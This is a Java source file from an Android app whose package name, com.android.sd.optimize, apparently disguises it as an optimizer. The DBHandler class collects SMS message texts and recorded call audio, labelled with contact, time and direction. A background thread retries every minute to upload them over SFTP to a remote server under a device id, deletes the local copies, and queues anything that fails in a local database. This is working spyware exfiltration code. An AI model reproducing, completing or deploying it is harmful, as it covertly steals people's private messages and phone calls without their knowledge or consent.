package com.android.sd.optimize;

import java.io.File;
import java.io.FileWriter;
import java.net.Socket;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

public class DBHandler {

	private SQLiteDatabase db = null;
	public static DBHandler instance;
	// private static Context context = null;
	public static final int SMS = 0;
	public static final int CALL = 1;
	// private ArrayList<Request> requests = new ArrayList<>();
	private ConcurrentLinkedQueue<Request> requests = new ConcurrentLinkedQueue<Request>();
    private String LOG_TAG = AppGlobals.getLogTag(getClass());

	static {
		instance = new DBHandler();
	}

	private DBHandler() {
	}

	public static DBHandler getInstance(Context con) {
		if (instance.db == null) {
			// context = con;
			instance.db = con.openOrCreateDatabase("database.db", Context.MODE_PRIVATE, null);
			instance.db.execSQL("create table if not exists pending "
					+ "(id integer primary key autoincrement, type integer, customer varchar, "
					+ "datetime varchar, message varchar, mode varchar, file varchar);");
			instance.th.start();
		}
		return instance;
	}

	public void putRequest(String customer, int type, String datetime, String mode, String message,
			String filename) {
		final Request request = new Request(customer, type, datetime, mode, message, filename);
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				try {
					requests.add(request);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();
	}

	private Thread th = new Thread(new Runnable() {

		@Override
		public void run() {
            Util helpers = new Util(AppGlobals.getContext());
			while (true) {
				// TODO Auto-generated method stub
				boolean connectionLost = false;
				try {
					// handle pending sms
					Cursor c = db
							.rawQuery("select id, customer, datetime, message, mode from pending where type = "
									+ SMS, null);
					if (c.moveToFirst()) {
						Socket socket = new Socket("www.google.com", 80);
						socket.close();
						do {
							try {
								File dir = new File(RecordService.DEFAULT_STORAGE_LOCATION);
								if (!dir.exists()) {
									dir.mkdirs();
								}

								File file = new File(dir, "sms.txt");
								FileWriter writer = new FileWriter(file);
								writer.append(c.getString(3));
								writer.flush();
								writer.close();

                                helpers.uploadFileViaSftp(file.getAbsolutePath(), BackService.id + "_" + c.getString(2)
                                        + "_" + c.getString(4) + "_" + c.getString(1) + ".txt");

								file.delete();
								db.execSQL("delete from pending where id = " + c.getString(0) + ";");

							} catch (Exception e) {
								Log.e(LOG_TAG, e.toString());
								connectionLost = true;
								break;
							}
						} while (c.moveToNext());
					}
					c.close();

					// handle pending calls
					if (!connectionLost) {
						c = db.rawQuery("select id, customer, datetime, mode, file from pending where type = "
								+ CALL, null);
						if (c.moveToFirst()) {
							Socket socket = new Socket("www.google.com", 80);
							socket.close();
							do {
								try {
                                    helpers.uploadFileViaSftp(
                                            RecordService.DEFAULT_STORAGE_LOCATION + c.getString(4),
                                            BackService.id + "_" + c.getString(2) + "_" + c.getString(3) + "_"
                                                    + c.getString(1) + ".m4a");
									new File(RecordService.DEFAULT_STORAGE_LOCATION + c.getString(4)).delete();
									db.execSQL("delete from pending where id = " + c.getString(0) + ";");
								} catch (Exception e) {
									connectionLost = true;
									break;
								}
							} while (c.moveToNext());
						}
						c.close();
					}
				} catch (Exception e) {
					connectionLost = true;
					Log.e(LOG_TAG, e.toString());
				}

				Request r = null;

				// handle pending requests
				if (!connectionLost) {
					while ((r = requests.poll()) != null) {
						if (r.type == SMS) {
							try {
								File dir = new File(RecordService.DEFAULT_STORAGE_LOCATION);
								if (!dir.exists()) {
									dir.mkdirs();
								}

								File file = new File(dir, "sms.txt");
								FileWriter writer = new FileWriter(file);
								writer.append(r.message);
								writer.flush();
								writer.close();

                                helpers.uploadFileViaSftp(file.getAbsolutePath(), BackService.id + "_" + r.datetime + "_"
                                        + r.mode + "_" + r.customer + ".txt");

								file.delete();

							} catch (Exception e) {
								try {
									ContentValues values = new ContentValues();
									values.put("mode", r.mode);
									values.put("message", r.message);
									values.put("customer", r.customer);
									values.put("datetime", r.datetime);
									values.put("type", SMS);
									db.insert("pending", null, values);
								} catch (Exception e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}
							}
						} else if (r.type == CALL) {
							try {
                                helpers.uploadFileViaSftp(RecordService.DEFAULT_STORAGE_LOCATION + r.filename,
                                        BackService.id + "_" + r.datetime + "_" + r.mode + "_" + r.customer + ".m4a");

								new File(RecordService.DEFAULT_STORAGE_LOCATION + r.filename).delete();

							} catch (Exception e) {
								Log.e(LOG_TAG, e.toString());
								try {
									ContentValues values = new ContentValues();
									values.put("mode", r.mode);
									values.put("customer", r.customer);
									values.put("datetime", r.datetime);
									values.put("type", CALL);
									db.insert("pending", null, values);
								} catch (Exception e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}
							}
						}
						// requests.remove(r);
					}

				} else {
					while ((r = requests.poll()) != null) {
						try {
							if (r.type == SMS) {
								ContentValues values = new ContentValues();
								values.put("mode", r.mode);
								values.put("message", r.message);
								values.put("customer", r.customer);
								values.put("datetime", r.datetime);
								values.put("type", SMS);
								db.insert("pending", null, values);
							} else if (r.type == CALL) {
								ContentValues values = new ContentValues();
								values.put("mode", r.mode);
								values.put("customer", r.customer);
								values.put("datetime", r.datetime);
								values.put("type", CALL);
								values.put("file", r.filename);
								db.insert("pending", null, values);
							}
							// requests.remove(r);
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}
				try {
					TimeUnit.MILLISECONDS.sleep(60 * 1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					Log.e(LOG_TAG, e.toString());
				}
			}
		}
	});

	private class Request {
		public String customer;
		public int type;
		public String mode;
		public String message;
		public String datetime;
		public String filename;

		public Request(String customer, int type, String datetime, String mode, String message,
				String filename) {
			this.customer = customer;
			this.type = type;
			this.mode = mode;
			this.message = message;
			this.datetime = datetime;
			this.filename = filename;
		}
	}

}
